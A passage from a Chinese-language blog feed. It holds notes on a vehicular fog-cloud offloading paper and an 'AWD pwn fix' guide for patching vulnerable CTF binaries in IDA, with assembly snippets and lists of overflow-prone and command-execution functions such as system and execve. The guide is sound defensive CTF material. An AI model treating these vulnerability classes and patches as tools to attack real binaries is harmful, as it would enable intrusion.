href="https://arttnba3.cn/2021/05/10/PWN-0X01-GLIBC_HEAP-EXPLOIT/#0x00-%E5%86%99%E5%9C%A8%E5%BC%80%E5%A7%8B%E4%B9%8B%E5%89%8D">【PWN.0x01】简易 Glibc heap exploit 笔记 - arttnba3’s blog</a></p><p>[<a href="https://bbs.kanxue.com/thread-272098.htm#msg_header_h2_2">原创] CTF 中 glibc堆利用 及 IO_FILE 总结-Pwn-看雪-安全社区|安全招聘|kanxue.com</a></p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ALL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>A Deep Learning Based Energy-Efficient  Computational Offloading Method in Internet of  Vehicles</title>
    <link href="/2024/01/21/%E8%AF%BB%E8%AE%BA%E6%96%87/"/>
    <url>/2024/01/21/%E8%AF%BB%E8%AE%BA%E6%96%87/</url>
    
    <content type="html"><![CDATA[<h2 id="前言：">前言：</h2><p>要做毕设惹</p><h2 id="一种基于深度学习的车联网节能计算卸载方法">一种基于深度学习的车联网节能计算卸载方法</h2><p>A Deep Learning Based Energy-Efficient  Computational Offloading Method in Internet of  Vehicles</p><h3 id="摘要"><strong>摘要</strong></h3><p>随着先进的车载应用程序的出现，满足车辆的计算和通信需求的挑战变得越来越突出。雾计算是一种潜在的解决方案，通过实现在网络边缘的计算卸载来改善先进的车辆服务。在本文中，我们提出了一种在车辆互联网（IoV）中的雾云计算卸载算法，以最小化车辆的功耗和计算设施的功耗。</p><p><strong>1.首先，建立了系统模型</strong></p><p><strong>2.然后将卸载问题表述为一个np难问题。</strong></p><p><strong>3.接着提出了一种启发式算法来逐步解决卸载问题。</strong></p><p><strong>具体来说，设计了一种车辆的预测组合传输模式，并建立了一种计算设施的深度学习模型，以获得最优的工作负荷分配。</strong></p><p>仿真结果表明了该算法在能源效率和网络延迟方面的优越性</p><h3 id="关键词"><strong>关键词</strong></h3><p>计算卸载、雾计算、深度学习；车辆网络</p><h3 id="1-介绍">1.介绍</h3><p>​随着物联网（IoT）和无线通信技术的发展，车辆变得更加智能，能够提供比以前更好的服务。随后，自动驾驶、图像识别等各种计算密集型应用不断涌现。然而，车辆有限的计算资源导致高级应用难以在现实中应用。如果没有强大的计算支持，各种应用仍处于概念阶段，无法应用于我们的日常生活中。</p><p>​云计算可以通过将任务卸载到具有丰富计算资源的云端来提高计算性能。然而，数据到云端的传输距离较长，不仅给无线通信链路带来了沉重的负担，而且导致了难以忍受的延迟，从而显着降低了应用程序的性能。</p><p>​雾计算是克服上述问题的一个有前途的范式，因为它将计算设施扩展到网络前端。它还有望减轻车辆沉重的计算负担。</p><p>1.雾节点通过减轻云的工作负载来降低功耗。</p><p>2.地理分布式雾设备可以减少消息传输延迟。</p><p>然而，不可能将所有任务卸载到雾层，因为仅雾模型的计算能力无法应对高工作负载下的延迟增长，并且一些复杂的计算任务应该卸载到远程云服务器。因此，做出有效的卸载决策以同时最小化具有延迟约束的计算设施和车辆的功耗至关重要。</p><p>论文提出了一种车联网（IoV）中的雾云计算卸载算法，以最大限度地减少车辆和计算设施的功耗。具体来说，<strong>贡献</strong>总结如下：</p><p><strong>1）建立了雾云卸载系统，然后制定了基于延迟约束的数学框架来优化功耗。</strong></p><p><strong>2）将整个系统分解为前端和后端两部分。之后，开发了车载网络中的组合传输算法和深度学习模型来分别解决前端和后端的优化问题。</strong></p><p><strong>3）进行模拟来验证我们的雾云计算卸载算法的有效性。</strong></p><p>仿真结果表明，它可以在满足延迟要求的同时显着优化功耗。</p><h3 id="2-相关工作">2.相关工作</h3><p>凭借丰富的计算资源，云计算在车联网系统中引起了极大的关注[9]。 [10] 中的作者提出了一种有前途的网络范式，在云上进行预测卸载，以最大限度地减少车联网系统中的延迟和功耗。</p><p>然而，<strong>云计算存在以下缺陷</strong>：</p><p><strong>首先，云服务器距离车辆较远，难以满足延迟敏感应用的需求。</strong></p><p><strong>其次，数据中心的电力消耗成本相当昂贵。</strong></p><p><strong>最后，云计算对车载应用的支持性能较差</strong>。</p><p>与移动云、小云和边缘计算类似，雾计算通过将云计算扩展到网络边缘而成为一种有前途的范例。</p><p>为满足多用户计算卸载需求，提出了移动云卸载模型，从而弥补了移动云的不足。</p><p>边缘计算通过充分利用车辆的闲置资源（例如移动中或停车位中的车辆）来实现实时交通管理。</p><p>然而，与云或小云计算相比，车辆边缘计算的计算和存储能力仍然有限。</p><p>此外，雾节点普遍缺乏通过自学习变得智能化的资源。</p><p>此外，对车辆移动性的准确预测很大程度上影响了其计算资源和能源的利用</p><p>一种方法是根据车辆的位置、方向和速度来挖掘交通流。</p><p>随着电动汽车的普及，人们开始研究车辆到电网技术来为电动汽车充电并在智能电网中监控其电力状态。 [19]中设计了车辆到电网网络的混合计算模型，包括永久云或小云和临时车辆雾节点。为了通过VFC提供安全的通信和服务，智能对于车联网中的网络控制和管理是必不可少的[20]。在[21]中，作者设计了一种由雾计算支持的分层架构，为邻里、社区和全市交通管理提供及时响应。</p><p>与现有研究不同，我们的目标是最小化车辆和计算设施的功耗。在前端（车辆侧），我们设计了组合传输算法来节省能源。此外，我们开发了一种深度学习方法来优化工作负载，以最大限度地减少后端（雾和云设施）的功耗。<strong>据我们所知，这是第一个针对如何通过深度学习方法在车联网系统卸载模型中最小化功耗提供详细设计的工作。</strong></p><h3 id="3-系统模型和问题表述">3.系统模型和问题表述</h3><p>如图所示，系统架构包括：一组路侧单元a set of Roadside Units（RSU）、雾设备和云服务器。 RSU 接收来自车辆的请求并将其发送到雾设备。在模型中，我们假设 RSU 可以覆盖实验区域内的所有车辆。车辆还可以基于蜂窝基站等其他设施接入网络，本文不予讨论。雾节点可以处理请求并通过广域网（WAN）将冗余请求转发到云服务器。每个云服务器托管许多虚拟机。由于广域网覆盖了从雾节点到云服务器的较大地理区域，因此相应的传输延迟不可忽视（与局域网相比）。此外，还应该考虑雾节点或云服务器的计算延迟。此外，从车辆到RSU的前端的功耗和延迟是系统性能的重要因素。因此，我们<strong>主要考虑云层、雾层、广域网调度以及车辆到路侧单元的传输过程四个部分的功耗和延迟。</strong></p><p><img src="/2024/01/21/%E8%AF%BB%E8%AE%BA%E6%96%87/image-20240120184917955.png" alt="图1.雾-云计算系统架构"></p><h4 id="3-1-系统模型">3.1 系统模型</h4><p>我们的目标是在保证车辆和车联网系统计算基础设施延迟的情况下最大限度地降低功耗。</p><h5 id="1）雾设备的功耗：">1）雾设备的功耗：</h5><p>论文里的意思就是一个线性关系式</p><p>雾设备的功耗=A*雾设备的频率+B</p><p>A，B是两个正常数，且预先确定的</p><h5 id="2）雾设备的通信延迟：">2）雾设备的通信延迟：</h5><p>假设它是雾设备处理请求的排队系统。对于设备，其计算延迟包括等待时间和服务时间，</p><p>计算延迟=1/（服务率-任务到达率）</p><h5 id="3）云服务器的功耗：">3）云服务器的功耗：</h5><p>如前所述，每台云服务器承载着大量的计算机。我们简单地假设云服务器中这些机器的 CPU 频率是相等的。通过CPU频率f的函数来近似服务器j中每台机器的功耗值</p><p>云服务器的功耗j=n*（A *云服务器中的某一个机器+B）</p><p>A，B是两个正常数</p><h5 id="4）云服务器通信延迟：">4）云服务器通信延迟：</h5><p>云服务器的延迟又可以分为等待延迟和处理延迟。</p><p>我们将系统建模为排队网络，所以可以建模为 M/M/n队列。</p><p>因此，云服务器的总计算延迟由下式给出：</p><p>公式有点小复杂，先略过</p><h5 id="5）通信传输延迟：">5）通信传输延迟：</h5><p>它可以分为两部分：调度的通信延迟和车辆与路侧单元之间的通信延迟。</p><p>对于调度的通信延迟，我们使用wij记录雾设备i到云服务器j的带宽。调度的通信延迟计算如下：</p><p>调度的通信延迟=数据大小/(Wij*(log2(1+n0)))</p><p>使用wij记录雾设备i到云服务器j的带宽，其中 n0=S/N 就是信噪比。</p><p>这个就是香农那个定理</p><p>对于车辆和RSU的通信延迟，我们考虑多跳V2I和V2V模式。对于V2I模式，相应的延迟包含两部分，即上传时间和从源到目标RSU的3个传输时间。对于V2V模式，传输延迟比V2I模型中的延迟要大，并且是上传时间和多跳车辆之间的V2V中继延迟的总和。 [10]中提出了一种实用的预测方案来预测多跳传输中的延迟。因此，车辆和 RSU 之间的延迟 可以通过 V2I 和 V2V 模式下的延迟组合来获得。</p><h5 id="6）传输功耗：">6）传输功耗：</h5><p>物理基础设施主要包括前端的RSU和车辆。一般来说，上传请求包的大小远大于请求结果返回包的大小。因此，我们主要关心上传链路的功耗和延迟，而忽略返回链路。令 R 和 U 分别为 RSU 和车辆的集合，其中 R = {1,…, R} 和 U = {1,…, U}。从车辆到 RSU 有两种传输模式。第一种是直接V2I模式，另一种是V2V预测传输模式。</p><p>我们可以通过添加从源到目的地的 RSU 之间的流量上传和中继来计算 V2I 模式下从车辆 u 到 RSU r 的任务的功耗。</p><p>对于V2V模式，消耗的能量比V2I模式低，并且是多跳车辆之间的流量上传和中继的总和。因此，考虑到相应的传输延迟和成本，车辆和RSU之间的功耗是V2I和V2V模式下延迟的组合。</p><h4 id="3-2-问题表述">3.2 问题表述</h4><p>我们的雾云集成框架的目标是在满足网络延迟约束的同时最大限度地减少功耗。如上分析，</p><p>网络总时延=雾设备i的时延+云设备j的时延+从i到j的传输时延+车辆和RSU之间的延迟</p><p>系统能耗由三部分组成，雾节点、云服务器以及车辆和RSU之间的总功耗</p><p>优化问题是最小化雾节点、云服务器以及车辆和RSU之间的总功耗。应满足以下约束：</p><p><strong>1) 总的网络延迟小于延迟阈值；</strong></p><p><strong>2）雾节点的处理能力是有限的，即其到达率和所需的CPU周期不能超过其处理能力的上限；</strong></p><p><strong>3）同样，对于云服务器，一台云服务器的到达率和云服务器分配的请求所需的CPU周期应该在云服务器的最大到达率和所需的CPU周期的范围内。</strong></p><p><strong>4）一台云服务器内的机器数量为整数，云服务器的运行状态为二进制。</strong></p><p><strong>5）云节点和云服务器处理的网络流量不少于要处理的总网络流量。</strong></p><p>上述问题是一个混合整数非线性规划（MINLP）问题，已被证明是NP困难的。因此，我们提出了一种启发式算法，用于基于雾的车联网系统中的卸载，以可接受的计算复杂度有效地解决所提出的问题。</p><h3 id="4-基于深度学习的能源高效卸载方案">4.基于深度学习的能源高效卸载方案</h3><p>我们将整个系统分为两部分：前端和后端。</p><p>前端由车辆和 RSU 组成。其成本主要是车辆和RSU之间通信的消耗和延迟，我们的目标是最小化Dur trans和Pur trans。我们采用预测组合传输方式来解决上述问题。</p><p>后端包含雾节点和云服务器，我们提出了一种深度学习模型以最小化其成本</p><h4 id="4-1-贪心算法">4.1 贪心算法</h4><p>在贪心算法中，请求被排队并依次处理。在每个步骤中，选择在约束下具有最小功耗的服务器来处理排队请求。对于每个请求，我们将其放置到当前的最佳位置。最终，我们得到这些请求的总功率消耗和延迟。</p><h4 id="4-2-深度学习模型">4.2 深度学习模型</h4><h5 id="1）输入和输出设计：">1）输入和输出设计：</h5><p>我们考虑的系统模型如图1所示。我们总共有n个可选的雾节点和云服务器来处理来自前端的请求。因此，每个节点都保存了最近H个周期内的请求数量和平均功耗的记录。 H的值由CPU频率和每个任务平均所需的CPU周期决定，我们选择CNN模型中损失最小的H值。我们采用这些记录作为深度学习模型的输入。</p><p>与[27]类似，我们也考虑卷积神经网络（CNN）结构。为了训练我们的 CNN 模型，需要标记数据（即 (x，y） 组）来执行监督训练</p><p>我们的目标是通过构建基于 CNN 的系统来识别网络流量的特征。如图2(a)所示，输入数据的低级特征在特征提取部分被过滤。池化层的目的是减少特征和参数的大小，并加快网络计算速度。通过从卷积层和池化层提取的特征，输出分类的效果可以通过全连接层来计算。在图2(b)中，服务器以多个间隔记录的信息是输入数据。</p><p><img src="/2024/01/21/%E8%AF%BB%E8%AE%BA%E6%96%87/image-20240121201242818.png" alt="图2基于CNN的深度学习模型"></p><p>它能被表示由三维矩阵，即通道、网络特征和服务节点。利用深度学习结构来计算候选服务器。因此，我们选择服务器编号作为深度学习模型的输出。因此，输出值的范围为[0, N-1]，表示服务器编号。</p><h5 id="2）初始化阶段：">2）初始化阶段：</h5><p>如输入和输出设计中所述，我们需要标记数据来训练我们的CNN模型。在初始化阶段，我们需要获取标记数据。初始化阶段的目的是获取标记数据，由输入向量和相应的输出结果组成。用全局解决方案来训练我们的 CNN 模型是最好的。然而，获得最优解的时间复杂度为O ( nm) ，这是不能容忍的。我们选择一种折衷的方法来获取标记数据，其中利用启发式算法来获得接近最优的解决方案。如算法1所示，模拟退火（SA）算法主要包括两个关键步骤：用一些函数生成新解以及以一定概率接受新解。我们将贪心算法的解作为SA算法中的初始解</p><p>SA算法在一定温度下迭代L次以搜索全局最优解。在搜索过程中，SA算法以exp( − Δt/ T ) 的概率接受较差解，其中Δt是新解与原解之间的评价差。通过1SA算法，我们可以在CNN模型中获得标记数据。我们的CNN模型的输入是最后H个间隔中服务器的记录信息。这样我们就得到了服务器的记录信息以及对应的卸载结果。</p><h5 id="3）训练阶段：">3）训练阶段：</h5><p>我们使用初始化阶段获得的数据来训练CNN模型。训练阶段包括两个步骤：初始化我们设计的 CNN 中的参数并使用反向传播算法微调参数。</p><p>初始化参数有必要，有利于加快收敛速度。 CNN 参数由平均值为零的正态高斯分布初始化。</p><p>对于前馈神经网络，参数优化取决于误差反向传播。优化阶段可以通过随机梯度下降算法或Adam算法来完成。由于Adam算法是自适应的，我们选择它作为训练阶段的优化算法，如算法2所示。在训练阶段，我们采用交叉熵成本函数作为损失函数。因此，输出是一个标量，它是输出层中最大值的神经元索引。</p><h5 id="4）运行阶段：">4）运行阶段：</h5><p>在运行阶段，所有服务器都需要记录一段时间内接收到的请求数量和平均功耗，然后将这些记录发送到边缘计算节点。这样，每个边缘节点就可以将这些记录作为输入来计算卸载结果。与训练阶段相比，运行阶段的计算复杂度相对较低。训练过程定期离线进行，以更新 CNN 模型中的权重。然而，有可能获得不符合要求的不适当的结果。</p><p>CNN运行阶段的约束。在这种情况下，我们采用贪心算法作为补偿。</p><h3 id="5-效果评估">5.效果评估</h3><p>为了验证模型的性能，我们对前端和后端进行了模拟。我们设置N = 20，M = 5，n j 在20和25之间，fi 在4.5和5.5之间，f j 在2.5和3.5之间，5 和 15MB之间的数据包大小，请求的周期在 0.7 到 0.9 之间。我们在前端使用预测组合传输模型。在发送请求之前，会发送广播数据包来询问附近的车辆或RSU后端处理延迟。根据延误结果和车辆速度，车辆可以计算请求返回时到达的RSU。</p><p>在结合模型中，估计V2I、V2V模型的功耗和延迟，选择最优的。在模拟中，我们假设车辆沿直线行驶。由于输入数据的大小是可控的，因此我们不考虑池化层。基于深度学习的模型的特征如图3所示。最后四个时间间隔的记录被用作网络输入，并且时间间隔设置为2秒。每个时间间隔内的平均请求数为 50。</p><p><img src="/2024/01/21/%E8%AF%BB%E8%AE%BA%E6%96%87/image-20240121202500267.png" alt="图3 CNN模型结构"></p><p>图 4 说明了不同车速和密度下的成本表现。在车速较高的情况下，组合传动模式的成本远低于V2I模式。对于V2I模式，随着速度从100到120（Km/h），成本显着增长。这是因为当请求返回时，大多数车辆都处于 RSU 覆盖范围的边缘。因此，当速度超过阈值时，车辆将驶入另一个 RSU。 V2I模式的成本将显着增加。另外，在流量密度大的情况下，组合传输方式效果显着，可以大幅降低V2V模式下每跳的时延和功耗。</p><p><img src="/2024/01/21/%E8%AF%BB%E8%AE%BA%E6%96%87/image-20240121202552366.png" alt="图4 直接V2I与组合传输模式的成本比较"></p><p>如图5(a)所示，仅雾的功耗极低，同时处理的请求不超过80个。雾+云模型比纯云模型要好得多。据观察，雾云模型的功耗与仅雾模型的功耗几乎相同，工作负载在 20 到 80 个请求之间。在这种情况下，雾计算的工作负载并未饱和，大多数请求都可以由雾节点处理。当工作负载超过80个请求时，雾层变得饱和，雾+云模型中的功耗增长趋势与纯云模型中的功耗增长趋势相似。值得注意的是，我们的雾+云模型的最大工作负载比其他两个模型大得多，这表明它可以很好地应对不同的流量分流需求。图 5(b) 说明了不同请求数量下总网络延迟的性能。总体而言，我们的雾+云模型的平均延迟小于1.5秒，可以满足延迟约束。对于仅云和仅雾卸载策略，随着请求数量的增加，它们的总延迟趋势急剧上升，而我们的雾+云模型的趋势则缓慢增强。此外，由于网络延迟的限制，这两种方法只能在一定程度上减轻网络流量的负担。</p><p><img src="/2024/01/21/%E8%AF%BB%E8%AE%BA%E6%96%87/image-20240121202947846.png" alt="图5 雾+云计算、云计算与雾计算的性能"></p><p>如前所述，我们将服务器的最后 H 间隔记录作为 CNN 模型的输入。我们将最后四个 Δt 间隔的记录作为输入，其中 Δt 等于 2 秒。在每个间隔Δt内，平均请求数为50。训练数据是通过SA算法在20个连续间隔内获得的。经过训练，我们得到CNN模型的请求卸载结果。不同算法的功耗如图6所示。从仿真结果来看，模拟退火算法的综合性能最好。然而，模拟退火算法在执行过程中非常耗时。我们的深度学习模型可以有效降低运行阶段的计算复杂度，并且性能比贪心算法要好得多。对于延迟，贪婪算法由于其对每个请求的延迟严格约束，因此比其他算法表现得更好。如图6(b)所示，三种算法的延迟均小于1秒。</p><p><img src="/2024/01/21/%E8%AF%BB%E8%AE%BA%E6%96%87/image-20240121203046015.png" alt="图6 深度学习、SA和贪心法的功耗和延迟性能"></p><h3 id="6-结论">6.结论</h3><p>在本文中，我们提出了一种基于深度学习的雾云模型，这是一种降低后端功耗和延迟的可行解决方案。卸载优化问题被公式化。对于雾节点，根据排队论可以将其建模为M/M/1模型。对于云服务器，它们可以被建模为M/M/n队列。此外，我们提出了一种预测组合传输模型，以最小化前端成本。在仿真中，我们可以得出这样的结论：与纯云模式和纯雾模式相比，雾云模型表现出良好的性能。我们的深度学习模型是解决所制定问题的近似方法。</p>]]></content>
    
    
    <categories>
      
      <category>论文笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IoV</tag>
      
      <tag>Deep Learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AWD pwn fix</title>
    <link href="/2023/06/24/AWDp/"/>
    <url>/2023/06/24/AWDp/</url>
    
    <content type="html"><![CDATA[<p>比赛中常见的 Fix 方法：</p><ul><li>nop free/syscall</li><li>mmap 7 改为 3</li><li>缩小 size</li></ul><h2 id="细节知识">细节知识</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//64 syscall table</span><br><span class="hljs-number">0</span>sys_read<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fd<span class="hljs-type">char</span> *buf<span class="hljs-type">size_t</span> count<br><span class="hljs-number">1</span>sys_write<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fd<span class="hljs-type">const</span> <span class="hljs-type">char</span> *buf<span class="hljs-type">size_t</span> count<br><span class="hljs-number">2</span>sys_open<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename<span class="hljs-type">int</span> flags<span class="hljs-type">int</span> mode<br></code></pre></td></tr></table></figure><h2 id="IDA-Patch">IDA Patch</h2><h3 id="快捷键">快捷键</h3><p>改函数名字：n</p><p>修补字节数：ctrl+alt+p</p><p>key patch: ctrl+alt+k</p><p>撤销：ctrl+z/ctrl+y，编辑-&gt;Keypatch-&gt;Undo last Patching</p><p>跳转到指定段：ctrl+s</p><p>编辑-&gt;函数-&gt;创建函数：p</p><p>​可以看.eh_frame的汇编</p><p><strong>修了别忘了保存：</strong> 编辑-&gt;修补程序-&gt;修补程序应用到输入文件</p><h3 id="格式化字符串">格式化字符串</h3><p><strong>容易造成格式化字符串漏洞的函数</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">printf</span> <span class="hljs-params">( <span class="hljs-type">const</span> <span class="hljs-type">char</span> * format, ... )</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">fprintf</span> <span class="hljs-params">( FILE * stream, <span class="hljs-type">const</span> <span class="hljs-type">char</span> * format, ... )</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">sprintf</span> <span class="hljs-params">( <span class="hljs-type">char</span> * str, <span class="hljs-type">const</span> <span class="hljs-type">char</span> * format, ... )</span>;<br></code></pre></td></tr></table></figure><h4 id="1-printf改puts"><strong>1.printf改puts</strong></h4><p>程序里有puts的话把call printf改成call puts</p><p>修改后会加\n，可能check不通过</p><h4 id="2-printf加-s"><strong>2.printf加%s</strong></h4><p>printf(xxx)改为printf(“%s”,xxxxx)</p><p>程序中不存在%s这个字符，手动添加</p><p>在.eh_frame这个段（ctrl+s跳转到段）中填入%s（25 73）这个字符串</p><p>在 lea     rax, [rbp+format]下面开始keypatch</p><p>改为：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">mov edi<span class="hljs-punctuation">,</span><span class="hljs-number">0</span><span class="hljs-keyword">x</span>（<span class="hljs-variable">%s</span>地址）<span class="hljs-comment">;mov rsi,rax</span><br></code></pre></td></tr></table></figure><p><img src="/2023/06/24/AWDp/1.png" alt="1"></p><h4 id="其他思路">其他思路</h4><p>增加代码，把printf改成write，没有write可以通过系统调用的形式</p><h3 id="栈溢出">栈溢出</h3><p><strong>容易造成栈溢出的函数</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> * <span class="hljs-title function_">memcpy</span> <span class="hljs-params">( <span class="hljs-type">void</span> * destination, <span class="hljs-type">const</span> <span class="hljs-type">void</span> * source, <span class="hljs-type">size_t</span> num )</span>;<br><span class="hljs-type">char</span> * <span class="hljs-title function_">strcpy</span> <span class="hljs-params">( <span class="hljs-type">char</span> * destination, <span class="hljs-type">const</span> <span class="hljs-type">char</span> * source )</span>;<br><span class="hljs-type">char</span> * <span class="hljs-title function_">strncpy</span> <span class="hljs-params">( <span class="hljs-type">char</span> * destination, <span class="hljs-type">const</span> <span class="hljs-type">char</span> * source, <span class="hljs-type">size_t</span> num )</span>;<br><span class="hljs-type">char</span> * <span class="hljs-title function_">gets</span><span class="hljs-params">(<span class="hljs-type">char</span>*str)</span>;<br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> count)</span>;<br><span class="hljs-type">size_t</span> <span class="hljs-title function_">fread</span> <span class="hljs-params">( <span class="hljs-type">void</span> * ptr, <span class="hljs-type">size_t</span> size, <span class="hljs-type">size_t</span> count, FILE * stream )</span>;<br><span class="hljs-type">char</span> * <span class="hljs-title function_">fgets</span> <span class="hljs-params">( <span class="hljs-type">char</span> * str, <span class="hljs-type">int</span> num, FILE * stream )</span>;<br><span class="hljs-type">char</span> * <span class="hljs-title function_">strcat</span> <span class="hljs-params">( <span class="hljs-type">char</span> * destination, <span class="hljs-type">const</span> <span class="hljs-type">char</span> * source )</span>;<br><span class="hljs-built_in">scanf</span>(“%s”, &amp;s);<br></code></pre></td></tr></table></figure><h4 id="1-改读字节数"><strong>1.改读字节数</strong></h4><h4 id="2-gets改read"><strong>2.gets改read</strong></h4><p>没有read可以通过系统调用的形式。</p><p>汇编长度尽量短吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#length:16<br>#sys_read(0, s, 0x100uLL)<br><br>lea rsi, qword ptr [rbp+0xFFFFFFFFFFFFFFF1];xor edi,edi;nop;mov edx,0x100;xor eax,eax;syscall<br></code></pre></td></tr></table></figure><p>修改前后对比：</p><p>把原本的lea rax改到rsi</p><p>用xor edi,edi;造0</p><p>nop;来间隔防止汇编解析错误</p><p><img src="/2023/06/24/AWDp/image-20230605171436314.png" alt="image-20230605171436314"></p><p><img src="/2023/06/24/AWDp/image-20230605171525120.png" alt="image-20230605171525120"></p><h4 id="其他思路-2">其他思路</h4><p>增加栈空间 sub rsp,xxxx</p><p>增加代码，过滤不可见字符：</p><ul><li>如果要跳转到库函数，call它的plt地址即可</li></ul><h3 id="UAF">UAF</h3><h4 id="1-nop-free！！！">1.nop free！！！</h4><h4 id="2-free后指针置0">2.free后指针置0</h4><p>call ef_frame地址，写入：call free;指针置零的汇编（具体抄题目）；ret</p><h5 id="例：ACTF-2019-babyheap"><strong>例：ACTF_2019_babyheap</strong></h5><p>就是free释放堆后，我们要写段代码把指针置0</p><p>修改前，可以看到是没有空间的</p><p><img src="/2023/06/24/AWDp/image-20230605191528872.png" alt="image-20230605191528872"></p><p>我们要把代码放到<code>.eh_frame</code>段里</p><p>我这里把<code>call free</code> 改为<code>call （eh_frame里的地址）</code></p><p>我这里选了<code>0x4010b0</code>,</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">call</span> <span class="hljs-number">0x4010b0</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>在<code>0x4010b0</code>写入</p><p>#这里是照抄原本汇编怎么赋值给rdi<br>#我这里省略一句赋值，直接用rax寄存器，然后接一句rax置零，最后ret</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">call free;<br>mov rax, qword ptr ds:ptr[rax*8]<br>#mov rdi, rax<br>mov qword ptr [rax], 0;<br>ret;<br></code></pre></td></tr></table></figure><p>修改前：</p><p><img src="/2023/06/24/AWDp/image-20230605194401967.png" alt="image-20230605194401967"></p><p>修改后：</p><p><img src="/2023/06/24/AWDp/image-20230605194240695.png" alt="image-20230605194240695"></p><p><img src="/2023/06/24/AWDp/image-20230605194307121.png" alt="image-20230605194307121"></p><p><img src="/2023/06/24/AWDp/image-20230605194332115.png" alt="image-20230605194332115"></p><p>应该是可以了</p><h3 id="堆溢出">堆溢出</h3><h4 id="1-改读字节数-2">1.改读字节数</h4><h4 id="2-gets改成read">2.gets改成read</h4><p>增加代码，没有read可以通过系统调用的形式。</p><h4 id="3-增加malloc申请的空间">3.增加malloc申请的空间</h4><h3 id="Off-by-one-null">Off by one/null</h3><p>改读字节数</p><h3 id="条件竞争">条件竞争</h3><p>sleep等消耗时间的函数nop掉</p><h3 id="整数溢出">整数溢出</h3><p>有符号跳转改为无符号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs assembly">无符号跳转：<br>JA ;无符号大于则跳转<br>JNA ;无符号不大于则跳转<br>JAE ;无符号大于等于则跳转 同JNB<br>JNAE ;无符号不大于等于则跳转 同JB<br>JB ;无符号小于则跳转<br>JNB ;无符号不小于则跳转<br>JBE ;无符号小于等于则跳转 同JNA<br>JNBE ;无符号不小于等于则跳转 同JA<br>有符号跳转：<br>JG ;有符号大于则跳转<br>JNG ;有符号不大于则跳转<br>JGE ;有符号大于等于则跳转 同JNL<br>JNGE ;有符号不大于等于则跳转 同JL<br>JL ;有符号小于则跳转<br>JNL ;有符号不小于则跳转<br>JLE ;有符号小于等于则跳转 同JNG<br>JNLE ;有符号不小于等于则跳转 同JG<br></code></pre></td></tr></table></figure><h3 id="数组越界">数组越界</h3><p>有符号跳转改为无符号</p><p>增加代码，判断index大小</p><h3 id="命令执行">命令执行</h3><p>把命令执行函数nop掉</p><p><strong>容易造成命令执行的函数</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">FILE *<span class="hljs-title function_">popen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *command, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *type)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">system</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *command)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">execve</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *pathname, <span class="hljs-type">char</span> *<span class="hljs-type">const</span> argv[], <span class="hljs-type">char</span> *<span class="hljs-type">const</span> envp[])</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">execl</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *arg, ...)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">execlp</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *file, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *arg, ...)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">execle</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span 